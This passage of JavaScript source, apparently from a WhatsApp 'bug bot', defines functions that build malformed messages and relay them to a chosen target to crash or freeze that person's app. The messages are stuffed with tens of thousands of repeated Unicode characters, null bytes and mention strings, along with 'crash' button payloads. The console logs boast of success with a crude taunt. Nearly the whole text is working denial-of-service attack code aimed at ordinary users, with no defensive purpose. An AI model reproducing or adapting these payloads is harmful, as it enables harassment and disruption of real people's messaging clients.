      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "🩸YT JustinOfficial-ID" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "🩸YT JustinOfficial-ID" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await xincrash.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Send Bug To ${target}`));
}

async function BlankClick(xincrash, target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "Information DanzOfficial" + "ោ៝".repeat(10000),
      caption: "🩸 YT DanzOfficial-ID " + "꧀".repeat(10000),
      inviteExpiration: "999999999"
    }
  };
  
    const msg2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: {
            body: { 
              text: "YT DanzOfficial-ID", 
              format: "DEFAULT" 
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(20000), 
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    };
    
  await xincrash.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });

  await xincrash.relayMessage(target, msg2, {
      participant: { jid: target },
      messageId: null
  });
  
  console.log(`${target} Sudah Di Ewe Oleh Danz`);
}
//--------------------{ End Function Bugs }--------------------//
